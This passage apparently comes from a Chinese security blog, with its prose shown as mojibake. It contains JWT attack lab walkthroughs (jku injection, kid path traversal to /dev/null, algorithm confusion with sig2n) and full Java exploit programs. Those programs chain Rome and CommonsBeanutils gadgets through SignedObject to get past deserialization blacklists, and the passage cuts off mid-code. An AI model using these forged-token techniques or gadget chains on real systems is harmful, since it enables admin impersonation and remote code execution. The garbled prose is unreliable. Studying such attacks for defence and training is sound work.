å®éªŒå·²ç»æä¾›äº†:exploit-serverï¼›å°†å…¬é’¥å¤åˆ¶çš„JWKæ”¾åˆ°Bodyéƒ¨åˆ† 12345{ &quot;keys&quot;: [ ]} æŠŠkidæ›¿æ¢ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„kid,å°†jkwå†™å‡ºexploit-serveråœ°å€ï¼›ç„¶åå°†æ”¹æˆadministratorï¼Œå†ç”¨ä¸€å¼€å§‹ç”Ÿæˆçš„RSAç­¾åå³å¯ æ³¨æ„ï¼šå¦‚æœä½ ç”¨çš„burpsuitæ˜¯ç›—ç‰ˆçš„è¯ï¼Œä½¿ç”¨æ’ä»¶å¯èƒ½signä¸æˆåŠŸï¼›æˆ‘æœ€ç»ˆæ˜¯ç”¨kaliè‡ªå¸¦çš„ç¤¾åŒºç‰ˆè§£å†³çš„ï¼› é€šè¿‡kidå‚æ•°æ³¨å…¥è‡ªç­¾åJWTæœåŠ¡å™¨å¯èƒ½ä½¿ç”¨å¤šä¸ªåŠ å¯†å¯†é’¥æ¥ç­¾ç½²ä¸åŒç±»å‹çš„æ•°æ®ï¼Œè€Œä¸ä»…ä»…æ˜¯ JWTã€‚å› æ­¤ï¼ŒJWT çš„ header ä¸­å¯èƒ½ä¼šåŒ…å«ä¸€ä¸ªkidï¼ˆKey IDï¼‰å‚æ•°ï¼Œè¯¥å‚æ•°å¯ä»¥å¸®åŠ©æœåŠ¡å™¨è¯†åˆ«åœ¨éªŒè¯ç­¾åæ—¶ä½¿ç”¨å“ªä¸ªå¯†é’¥ã€‚ éªŒè¯å¯†é’¥é€šå¸¸å­˜å‚¨ä¸º JWK é›†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å¯ä»¥ç®€å•åœ°æŸ¥æ‰¾ä¸kidä»¤ç‰Œç›¸åŒçš„JWKã€‚ç„¶è€Œï¼ŒJWS è§„èŒƒå¹¶æœªå®šä¹‰æ­¤ ID çš„å…·ä½“ç»“æ„ - å®ƒåªæ˜¯å¼€å‘äººå‘˜é€‰æ‹©çš„ä»»æ„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œä»–ä»¬å¯èƒ½ä½¿ç”¨kidå‚æ•°æ¥æŒ‡å‘æ•°æ®åº“ä¸­çš„ç‰¹å®šæ¡ç›®ï¼Œç”šè‡³æ˜¯æ–‡ä»¶åã€‚ å¦‚æœæ­¤å‚æ•°ä¹Ÿå®¹æ˜“å—åˆ°ç›®å½•éå†çš„æ”»å‡»ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šå¼ºåˆ¶æœåŠ¡å™¨ä½¿ç”¨å…¶æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä»»æ„æ–‡ä»¶ä½œä¸ºéªŒè¯å¯†é’¥ã€‚ 123456{ &quot;kid&quot;: &quot;../../path/to/file&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;, &quot;k&quot;: &quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;} å¦‚æœæœåŠ¡å™¨è¿˜æ”¯æŒä½¿ç”¨å¯¹ç§°ç®—æ³•ç­¾åçš„ JWTï¼Œåˆ™è¿™å°¤å…¶å±é™©ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå°†kidå‚æ•°æŒ‡å‘å¯é¢„æµ‹çš„é™æ€æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ä¸è¯¥æ–‡ä»¶å†…å®¹åŒ¹é…çš„å¯†é’¥å¯¹ JWT è¿›è¡Œç­¾åã€‚ ç†è®ºä¸Šï¼Œæ‚¨å¯ä»¥å¯¹ä»»ä½•æ–‡ä»¶æ‰§è¡Œæ­¤æ“ä½œï¼Œä½†æœ€ç®€å•çš„æ–¹æ³•ä¹‹ä¸€æ˜¯ä½¿ç”¨/dev/nullï¼Œå®ƒå­˜åœ¨äºå¤§å¤šæ•° Linux ç³»ç»Ÿä¸Šã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œè¯»å–å®ƒä¼šè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚å› æ­¤ï¼Œä½¿ç”¨ç©ºå­—ç¬¦ä¸²å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åå°†å¾—åˆ°æœ‰æ•ˆçš„ç­¾åã€‚ å®éªŒå¦‚ä¸‹ æ–°å»ºå¯¹ç§°å¯†é’¥;è¯·æ³¨æ„ï¼Œæ‚¨æ— éœ€é€‰æ‹©å¯†é’¥å¤§å°ï¼Œå› ä¸ºç¨åä¼šè‡ªåŠ¨æ›´æ–°ã€‚å°†ç”Ÿæˆçš„å±æ€§å€¼æ›¿æ¢kä¸º Base64 ç¼–ç çš„ç©ºå­—èŠ‚ ( AA==)ã€‚ å°†å‚æ•°çš„å€¼æ›´æ”¹kidä¸ºæŒ‡å‘/dev/nullæ–‡ä»¶,ä¿®æ”¹ä¸ºadministrator;å•å‡»Signï¼Œç„¶åé€‰æ‹©åœ¨ä¸Šä¸€éƒ¨åˆ†ä¸­ç”Ÿæˆçš„å¯¹ç§°å¯†é’¥å³å¯ JWTç®—æ³•æ··æ·†æ”»å‡»å½“æ”»å‡»è€…èƒ½å¤Ÿå¼ºåˆ¶æœåŠ¡å™¨ä½¿ç”¨ä¸ç½‘ç«™å¼€å‘äººå‘˜é¢„æœŸä¸åŒçš„ç®—æ³•æ¥éªŒè¯ JSON Web ä»¤ç‰Œ ( JWT ) çš„ç­¾åæ—¶ï¼Œå°±ä¼šå‘ç”Ÿç®—æ³•æ··æ·†æ”»å‡»ï¼ˆä¹Ÿç§°ä¸ºå¯†é’¥æ··æ·†æ”»å‡»ï¼‰ã€‚å¦‚æœè¿™ç§æƒ…å†µå¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä¼ªé€ åŒ…å«ä»»æ„å€¼çš„æœ‰æ•ˆ JWTï¼Œè€Œæ— éœ€çŸ¥é“æœåŠ¡å™¨çš„ç§˜å¯†ç­¾åå¯†é’¥ã€‚ ç®—æ³•æ··æ·†æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿç®—æ³•æ··ä¹±æ¼æ´é€šå¸¸æ˜¯ç”±äº JWT åº“çš„å®ç°æœ‰ç¼ºé™·è€Œå¼•èµ·çš„ã€‚å°½ç®¡å®é™…çš„éªŒè¯è¿‡ç¨‹å› æ‰€ä½¿ç”¨çš„ç®—æ³•è€Œå¼‚ï¼Œä½†è®¸å¤šåº“æä¾›äº†ä¸€ç§ä¸ç®—æ³•æ— å…³çš„å•ä¸€æ–¹æ³•æ¥éªŒè¯ç­¾åã€‚è¿™äº›æ–¹æ³•ä¾èµ–äºalgä»¤ç‰Œæ ‡å¤´ä¸­çš„å‚æ•°æ¥ç¡®å®šå®ƒä»¬åº”æ‰§è¡Œçš„éªŒè¯ç±»å‹ã€‚ ä»¥ä¸‹ä¼ªä»£ç æ˜¾ç¤ºäº†æ­¤æ³›å‹verify()æ–¹æ³•çš„å£°æ˜åœ¨ JWT åº“ä¸­çš„ç®€åŒ–ç¤ºä¾‹ï¼š 12345678function verify(token, secretOrPublicKey){ algorithm = token.getAlgHeader(); if(algorithm == &quot;RS256&quot;){ // Use the provided key as an RSA public key } else if (algorithm == &quot;HS256&quot;){ // Use the provided key as an HMAC secret key }} å½“éšåä½¿ç”¨æ­¤æ–¹æ³•çš„ç½‘ç«™å¼€å‘äººå‘˜å‡è®¾å®ƒå°†ä¸“é—¨å¤„ç†ä½¿ç”¨ RS256 ç­‰éå¯¹ç§°ç®—æ³•ç­¾åçš„ JWT æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ç”±äºè¿™ä¸ªæœ‰ç¼ºé™·çš„å‡è®¾ï¼Œä»–ä»¬å¯èƒ½æ€»æ˜¯å°†å›ºå®šçš„å…¬é’¥ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123publicKey = &lt;public-key-of-server&gt;;token = request.getCookie(&quot;session&quot;);verify(token, publicKey); åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæœåŠ¡å™¨æ”¶åˆ°ä½¿ç”¨ HS256 ç­‰å¯¹ç§°ç®—æ³•ç­¾åçš„ä»¤ç‰Œï¼Œåˆ™åº“çš„é€šç”¨verify()æ–¹æ³•ä¼šå°†å…¬é’¥è§†ä¸º HMAC ç§˜å¯†ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ HS256 å’Œå…¬é’¥å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œå¹¶ä¸”æœåŠ¡å™¨å°†ä½¿ç”¨ç›¸åŒçš„å…¬é’¥æ¥éªŒè¯ç­¾åã€‚ æ³¨æ„ï¼šç”¨äºç­¾ç½²ä»¤ç‰Œçš„å…¬é’¥å¿…é¡»ä¸æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„å…¬é’¥å®Œå…¨ç›¸åŒã€‚è¿™åŒ…æ‹¬ä½¿ç”¨ç›¸åŒçš„æ ¼å¼ï¼ˆä¾‹å¦‚ X.509 PEMï¼‰ æ‰§è¡Œç®—æ³•æ··æ·†æ”»å‡»ç®—æ³•æ··æ·†æ”»å‡»é€šå¸¸æ¶‰åŠä»¥ä¸‹é«˜çº§æ­¥éª¤ï¼š è·å–æœåŠ¡å™¨çš„å…¬é’¥ å°†å…¬é’¥è½¬æ¢ä¸ºåˆé€‚çš„æ ¼å¼ åˆ›å»ºä¸€ä¸ªæ¶æ„ JWTï¼Œå…¶è´Ÿè½½ç»è¿‡ä¿®æ”¹ï¼Œalgæ ‡å¤´è®¾ç½®ä¸ºHS256. ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œä½¿ç”¨ HS256 å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åã€‚ å¯ä»¥è·å–æœåŠ¡å™¨çš„å…¬é’¥éå¸¸é‡è¦ï¼›ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨æœ‰æ—¶ä¼šé€šè¿‡æ˜ å°„åˆ°/jwks.json çš„ æ ‡å‡†ç«¯ç‚¹å°†å…¶å…¬é’¥å…¬å¼€ä¸º JSON Web Key (JWK) å¯¹è±¡ã€‚/.well-known/jwks.jsonè¿™äº›å¯ä»¥å­˜å‚¨åœ¨åä¸º çš„ JWK æ•°ç»„ä¸­keysã€‚è¿™ç§°ä¸º JWK é›†ã€‚ æ³¨æ„ï¼šç§é’¥ç”¨äºè§£å¯†æ•°æ®æˆ–ç”Ÿæˆæ•°å­—ç­¾åï¼›è€Œå…¬é’¥ç”¨äºåŠ å¯†æ•°æ®æˆ–éªŒè¯æ•°å­—ç­¾å å®éªŒå¦‚ä¸‹ï¼š è®¿é—®jwks.jsonæ‹¿åˆ°å…¬é’¥ï¼Œ 123456789101112{ &quot;keys&quot;:[ { &quot;kty&quot;:&quot;RSA&quot;, &quot;e&quot;:&quot;AQAB&quot;, &quot;use&quot;:&quot;sig&quot;, &quot;kid&quot;:&quot;0db5403e-6f79-47e5-aa30-b005a59dc7be&quot;, &quot;alg&quot;:&quot;RS256&quot;, &quot;n&quot;:&quot;mVx2PicKCcRTrUZ-2rcpVVGjUedQie9HKP8coUmvWY7eKHb7XoHZVj9kD79CW5bRtipLV27NzeunNwtbXfYRTVRD33C6oDF393Q0czJc63EXmMCE6p2MWKpsieVhPe5XjK0L7UGm1BGSGafMndQrjdNv2V1eMnz5oX1AsSwltMDkZD_wFrhVxBXO71GmHfm4jWYoJzchr1Z5X_DCM6Q_0cWZ4PLl9GVeCZwiZg-5SvGvhwEOeKqnJriulWIubqCouY2ygOVNbmMK0_L8SPHXfntZ4JXm0pvRbV-gufizH7vnAJfJ7O7dMc6AVTqSNnWNWIgp1_Z8VQ253WkM77dpEw&quot; } ]} å¹¶è½¬åŒ–æˆpemæ ¼å¼ï¼Œå¯ä»¥åˆ©ç”¨pythonè„šæœ¬ 1234567891011121314151617181920212223242526272829303132import base64import binasciiimport jsonfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import hashesjwk_data = { &quot;keys&quot;:[ { &quot;kty&quot;:&quot;RSA&quot;, &quot;e&quot;:&quot;AQAB&quot;, &quot;use&quot;:&quot;sig&quot;, &quot;kid&quot;:&quot;0db5403e-6f79-47e5-aa30-b005a59dc7be&quot;, &quot;alg&quot;:&quot;RS256&quot;, &quot;n&quot;:&quot;mVx2PicKCcRTrUZ-2rcpVVGjUedQie9HKP8coUmvWY7eKHb7XoHZVj9kD79CW5bRtipLV27NzeunNwtbXfYRTVRD33C6oDF393Q0czJc63EXmMCE6p2MWKpsieVhPe5XjK0L7UGm1BGSGafMndQrjdNv2V1eMnz5oX1AsSwltMDkZD_wFrhVxBXO71GmHfm4jWYoJzchr1Z5X_DCM6Q_0cWZ4PLl9GVeCZwiZg-5SvGvhwEOeKqnJriulWIubqCouY2ygOVNbmMK0_L8SPHXfntZ4JXm0pvRbV-gufizH7vnAJfJ7O7dMc6AVTqSNnWNWIgp1_Z8VQ253WkM77dpEw&quot; } ]}for key in jwk_data[&quot;keys&quot;]: modulus = int.from_bytes(base64.urlsafe_b64decode(key[&quot;n&quot;] + &quot;===&quot;), &quot;big&quot;) exponent = int.from_bytes(base64.urlsafe_b64decode(key[&quot;e&quot;] + &quot;===&quot;), &quot;big&quot;) public_numbers = rsa.RSAPublicNumbers(exponent, modulus) public_key = public_numbers.public_key() pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) print(pem.decode()) æˆ–è€…burpæ’ä»¶ æ–°å»º RSA å¯†é’¥,å¤åˆ¶åˆ°keyæ¡†ä¸­ï¼Œå†é€‰æ‹©pemå•é€‰æ¡†æˆ–è€…å³é”®å•å‡»åˆšåˆšåˆ›å»ºçš„å¯†é’¥æ¡ç›®ï¼Œç„¶åé€‰æ‹©å°†å…¬é’¥å¤åˆ¶ä¸º PEM(æ³¨æ„è¿™é‡Œæœ€åæœ‰ä¸ªæ¢è¡Œç¬¦) å¯¹æ­¤ PEM å¯†é’¥è¿›è¡Œ Base64 ç¼–ç ï¼Œç„¶åå¤åˆ¶ç”Ÿæˆçš„å­—ç¬¦ä¸² æ–°å»ºå¯¹ç§°å¯†é’¥ã€‚åœ¨å¯¹è¯æ¡†ä¸­ï¼Œå•å‡»â€œç”Ÿæˆâ€ä»¥ç”Ÿæˆ JWK æ ¼å¼çš„æ–°å¯†é’¥ã€‚è¯·æ³¨æ„ï¼Œæ‚¨æ— éœ€é€‰æ‹©å¯†é’¥å¤§å°ï¼Œå› ä¸ºç¨åä¼šè‡ªåŠ¨æ›´æ–°ï¼›å°† k å±æ€§çš„ç”Ÿæˆå€¼æ›¿æ¢ä¸ºæ‚¨åˆšåˆšåˆ›å»ºçš„ Base64 ç¼–ç çš„ PEMã€‚ å°†algå‚æ•°çš„å€¼æ›´æ”¹ä¸ºHS256ã€‚å°†å£°æ˜çš„å€¼æ›´æ”¹subä¸ºadministratorã€‚å•å‡»Signï¼Œç„¶åé€‰æ‹©åœ¨ä¸Šä¸€éƒ¨åˆ†ä¸­ç”Ÿæˆçš„å¯¹ç§°å¯†é’¥å³å¯; ä»ç°æœ‰ä»¤ç‰Œæ´¾ç”Ÿå…¬é’¥åœ¨å…¬é’¥ä¸æ˜“è·å¾—çš„æƒ…å†µä¸‹ï¼Œæ‚¨ä»ç„¶å¯ä»¥é€šè¿‡ä»ä¸€å¯¹ç°æœ‰ JWT æ´¾ç”Ÿå¯†é’¥æ¥æµ‹è¯•ç®—æ³•æ··æ·†ã€‚ä½¿ç”¨è¯¸å¦‚ ä¹‹ç±»çš„å·¥å…·ï¼Œæ­¤è¿‡ç¨‹ç›¸å¯¹ç®€å•jwt_forgery.pyã€‚æ‚¨å¯ä»¥åœ¨rsa_sign2nGitHub å­˜å‚¨åº“ä¸Šæ‰¾åˆ°æ­¤è„šæœ¬ä»¥åŠå…¶ä»–å‡ ä¸ªæœ‰ç”¨çš„è„šæœ¬ã€‚ æˆ‘ä»¬è¿˜åˆ›å»ºäº†è¯¥å·¥å…·çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥å°†å…¶ä½œä¸ºå•ä¸ªå‘½ä»¤è¿è¡Œï¼š 1docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt; è¿™å°†ä½¿ç”¨æ‚¨æä¾›çš„ JWT æ¥è®¡ç®— çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ½œåœ¨å€¼nã€‚ä¸è¦å¤ªæ‹…å¿ƒè¿™æ„å‘³ç€ä»€ä¹ˆ - æ‚¨éœ€è¦çŸ¥é“çš„æ˜¯åªæœ‰å…¶ä¸­ä¹‹ä¸€nä¸æœåŠ¡å™¨å¯†é’¥ä½¿ç”¨çš„å€¼ç›¸åŒ¹é…ã€‚å¯¹äºæ¯ä¸ªæ½œåœ¨å€¼ï¼Œæˆ‘ä»¬çš„è„šæœ¬è¾“å‡ºï¼š X.509 å’Œ PKCS1 æ ¼å¼çš„ Base64 ç¼–ç  PEM å¯†é’¥ã€‚ ä½¿ç”¨æ¯ä¸ªå¯†é’¥ç­¾åçš„ä¼ªé€  JWTã€‚ è¦è¯†åˆ«æ­£ç¡®çš„å¯†é’¥ï¼Œè¯·ä½¿ç”¨ Burp Repeater å‘é€åŒ…å«æ¯ä¸ªä¼ªé€  JWT çš„è¯·æ±‚ã€‚æœåŠ¡å™¨ä»…æ¥å—å…¶ä¸­ä¹‹ä¸€ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åŒ¹é…å¯†é’¥æ¥æ„é€ ç®—æ³•æ··æ·†æ”»å‡»ã€‚ å®éªŒå¦‚ä¸‹ï¼š è·å–æœåŠ¡å™¨ç”Ÿæˆçš„ä¸¤ä¸ª JWT(ç™»é™†ç¬¬ä¸€æ¬¡ï¼Œæ‹¿åˆ°ä¸€ä¸ªjwtä»¤ç‰Œåé€€å‡ºï¼Œå†ç™»é™†ç¬¬äºŒæ¬¡ï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªjwtä»¤ç‰Œ) åœ¨ç»ˆç«¯ä¸­ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¹¶ä¼ å…¥ä¸¤ä¸ª JWT ä½œä¸ºå‚æ•°ã€‚ 1docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt; è¯·æ³¨æ„ï¼Œè¾“å‡ºåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª çš„è®¡ç®—å€¼nã€‚å…¶ä¸­æ¯ä¸€é¡¹åœ¨æ•°å­¦ä¸Šéƒ½æ˜¯å¯èƒ½çš„ï¼Œä½†åªæœ‰å…¶ä¸­ä¸€é¡¹ä¸æœåŠ¡å™¨ä½¿ç”¨çš„å€¼åŒ¹é…ã€‚ è¿”å›åˆ° Burp Repeater ä¸­çš„è¯·æ±‚å¹¶å°†è·¯å¾„æ›´æ”¹å›/my-account;å°†ä¼šè¯ cookie æ›¿æ¢ä¸ºè¿™ä¸ªæ–°çš„ JWTï¼Œç„¶åå‘é€è¯·æ±‚;å‘ç°ç¬¬äºŒä¸ªæˆåŠŸè¿”å›200ï¼›è¯´æ˜æˆåŠŸï¼› ä»ç»ˆç«¯çª—å£ä¸­ï¼Œå¤åˆ¶æ‚¨åœ¨ä¸Šä¸€éƒ¨åˆ†ä¸­ç¡®å®šä¸ºæ­£ç¡®çš„ Base64 ç¼–ç çš„ X.509 å¯†é’¥ã€‚è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦é€‰æ‹©å¯†é’¥ï¼Œè€Œä¸æ˜¯ä¸Šä¸€èŠ‚ä¸­ä½¿ç”¨çš„è¢«ç¯¡æ”¹çš„ JWTã€‚","link":"/2024/02/08/JWT%E6%BC%8F%E6%B4%9E/"},{"title":"JavaäºŒæ¬¡ååºåˆ—åŒ–æ¼æ´","text":"å‰è¨€åœ¨å­¦ä¹ FastJsonä½ç‰ˆæœ¬æ¼æ´æ—¶ï¼Œæœºå™¨ä¸å‡ºç½‘æ—¶ï¼Œå¯ä»¥åˆ©ç”¨C3P0äºŒæ¬¡ååºåˆ—åŒ–æ‰“å†…å­˜é©¬ï¼›ä¹‹å‰å°±å¬è¯´è¿‡JavaäºŒæ¬¡ååºåŒ–ï¼Œä½†æ˜¯ä¸€ç›´ä¸çŸ¥é“æ˜¯å•¥ï¼›æ­£å¥½å¯ä»¥å­¦ä¹ ä¸€æ³¢ï¼› å‚è€ƒ@Poriaå¸ˆå‚… ç®€å•ä»‹ç»ä¼—æ‰€å‘¨çŸ¥ï¼Œcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplç±»ä¹ƒä¸‡æ¶ä¹‹æº(ç±»åŠ è½½)ï¼Œå¾ˆå¤šåˆ©ç”¨é“¾æœ€åéƒ½æ˜¯åˆ©ç”¨äº†å®ƒï¼›å¦‚æœæ­¤ç±»åœ¨é»‘åå•äº†è¯¥æ€ä¹ˆåŠï¼Ÿ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥åˆ©ç”¨äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•ï¼› ç®€å•ä»‹ç»ä¸‹äºŒæ¬¡ååºåˆ—åŒ–ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ååºåˆ—åŒ–ä¸¤æ¬¡ï¼Œå…¶ä¸»è¦æ„ä¹‰åœ¨äºç»•è¿‡é»‘åå•çš„é™åˆ¶æˆ–ä¸å‡ºç½‘åˆ©ç”¨æˆ–è€…ç»•è¿‡ä¸€äº›loadClass()ä¸èƒ½å¤ŸåŠ è½½æ•°ç»„çš„é—®é¢˜ï¼› åˆ©ç”¨æ–¹æ³•SignedObjectjava.securityä¸‹çš„ä¸€ä¸ªç±»ï¼› å…¶æ„é€ æ–¹æ³•ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°åºåˆ—åŒ–ï¼Œç„¶åèµ‹å€¼ç»™contentå±æ€§ï¼ŒSignedObjectçš„getObjectæ–¹æ³•ä¼šå°†contentå±æ€§ååºåˆ—åŒ– åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼šå…ˆæ„é€ ä¸€ä¸ªæ¶æ„SignedObjectï¼Œç„¶åè°ƒç”¨å®ƒçš„getObject()æ–¹æ³•å³å¯ 1234KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);kpg.initialize(1024);KeyPair kp = kpg.generateKeyPair();SignedObject signedObject = new SignedObject(æ¶æ„å¯¹è±¡ ç”¨äºç¬¬äºŒæ¬¡ååºåˆ—åŒ–, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); åˆ©ç”¨æ€è·¯: è°çš„æ–¹æ³•è°ƒç”¨äº†getObjectæ–¹æ³•ï¼Œç„¶åä¸€ç›´å¾€ä¸Šè·Ÿreadobjectæˆ–è€…getteræ–¹æ³• è°çš„åå°„å¯æ§ï¼Œç›´æ¥è¿›è¡Œåå°„è°ƒç”¨ è€ŒRomeå’ŒCBä¸­æ˜¯å¯ä»¥è°ƒç”¨æŸä¸ªç±»çš„gettersæ–¹æ³•çš„ï¼Œ Romeæ³¨æ„ï¼šæˆ‘é‡å†™äº†resolveClassæ–¹æ³•ï¼Œæ–¹ä¾¿çœ‹åœ¨ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–æ—¶ä½¿ç”¨äº†é‚£äº›ç±»å 1234567891011121314151617import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;public class MyObjectInputStream extends ObjectInputStream{ public MyObjectInputStream(InputStream in) throws IOException { super(in); } @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { System.out.println(desc.getName()); return super.resolveClass(desc); }} ä¼—æ‰€å‘¨çŸ¥Romeæœ‰ä¸¤æ¡ï¼Œæ—¢å¯ä»¥ç”¨HashCodeä¹Ÿå¯ä»¥ç”¨equalsï¼› æˆ‘è¿™é‡Œä»¥HashCodeä¸ºä¾‹ï¼šçœ‹ç€å¾ˆé•¿ï¼Œå…¶å®å°±æ˜¯åœ¨ä¹‹å‰çš„å¯¹è±¡ä¸Šå¥—äº†ä¸€å±‚SignedObjectè€Œå·² 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import org.apache.commons.collections.functors.ConstantTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.HashMap;public class RomeHashCode { public static void main(String[] args) throws Exception { TemplatesImpl fakeTemplates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;zIxyd&quot;); setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{code}); HashMap hashMap1 = getpayload(Templates.class, fakeTemplates,templates); KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); SignedObject dsa = new SignedObject(new ConstantTransformer(1), kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); HashMap hashMap2 = getpayload(SignedObject.class, dsa,signedObject); serialize(hashMap2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void setFieldValue(Object object,String field,Object value) throws NoSuchFieldException, IllegalAccessException { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object,value); } public static HashMap getpayload(Class clazz, Object flaseObject,Object trueObject) throws Exception { //romeé“¾çš„å…³é”® ToStringBean toStringBean = new ToStringBean(clazz, flaseObject); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,1); //é˜²æ­¢åºåˆ—åŒ–æ—¶å‘½ä»¤æ‰§è¡Œ Class toStringBeanClass = toStringBean.getClass(); Field object = toStringBeanClass.getDeclaredField(&quot;_obj&quot;); object.setAccessible(true); object.set(toStringBean,trueObject); return hashMap; }} å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸç»•è¿‡com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; CBå› ä¸ºCBé“¾ä¹Ÿæ˜¯å¯ä»¥è°ƒç”¨æŸä¸ªç±»çš„gettersæ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é€šè¿‡SignedObject.getObject()æ¥äºŒæ¬¡ååºåˆ—åŒ– 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.PriorityQueue;public class CB { public static void main(String[] args) throws Exception { TemplatesImpl fakeTemplates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;zIxyd&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); PriorityQueue priorityQueue1 = getPayload(templates, &quot;outputProperties&quot;); KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(priorityQueue1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); PriorityQueue priorityQueue2 = getPayload(signedObject, &quot;object&quot;); serialize(priorityQueue2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;cc.bin&quot;)); ois.readObject(); ois.close(); } public static void setFieldValue(Object object, String field, Object value) throws Exception { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static PriorityQueue getPayload(Object object, String string) throws NoSuchFieldException, IllegalAccessException { BeanComparator beanComparator = new BeanComparator(string); //é˜²æ­¢åºåˆ—åŒ–æ—¶è°ƒç”¨; TransformingComparator transformingComparator = new 